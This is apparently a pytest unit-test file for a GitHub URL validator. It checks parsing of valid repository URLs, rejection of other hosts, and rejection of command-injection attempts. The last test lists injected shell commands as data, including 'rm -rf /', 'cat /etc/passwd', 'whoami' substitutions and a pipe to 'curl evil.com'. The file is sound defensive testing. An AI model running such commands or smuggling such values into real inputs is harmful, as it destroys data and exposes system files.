"""Unit tests for GitHub URL validation and security checks."""

import pytest

from backend.app.ingestion.github import validate_github_url


def test_valid_github_urls():
    """Verify that standard GitHub repository URLs are correctly parsed."""
    cases = [
        ("https://github.com/owner/repo", "owner", "repo"),
        ("https://github.com/owner/repo.git", "owner", "repo"),
        ("https://www.github.com/owner/repo/", "owner", "repo"),
        ("http://github.com/fastapi/fastapi", "fastapi", "fastapi"),
        ("https://github.com/my-org/project_v2.0", "my-org", "project_v2.0"),
    ]
    for url, expected_owner, expected_repo in cases:
        parsed = validate_github_url(url)
        assert parsed["owner"] == expected_owner
        assert parsed["repo"] == expected_repo
        assert parsed["clean_url"] == f"https://github.com/{expected_owner}/{expected_repo}.git"


def test_invalid_github_urls():
    """Verify that non-GitHub hosts or malformed URLs are rejected."""
    invalid_cases = [
        "",
        "not_a_url",
        "ftp://github.com/owner/repo",
        "https://gitlab.com/owner/repo",
        "https://bitbucket.org/owner/repo",
        "https://github.com/",
        "https://github.com/onlyowner",
        "https://evil.github.com/owner/repo",
    ]
    for url in invalid_cases:
        with pytest.raises(ValueError):
            validate_github_url(url)


def test_command_injection_rejected():
    """Verify that dangerous metacharacters and shell injections are rejected."""
    injection_cases = [
        "https://github.com/owner/repo;rm -rf /",
        "https://github.com/owner/repo`whoami`",
        "https://github.com/owner/repo$(whoami)",
        "https://github.com/owner/repo|curl evil.com",
        "https://github.com/owner/repo&echo hacked",
        "https://github.com/owner/repo\ncat /etc/passwd",
        "https://github.com/owner/repo < /dev/zero",
    ]
    for url in injection_cases:
        with pytest.raises(ValueError, match="illegal characters"):
            validate_github_url(url)
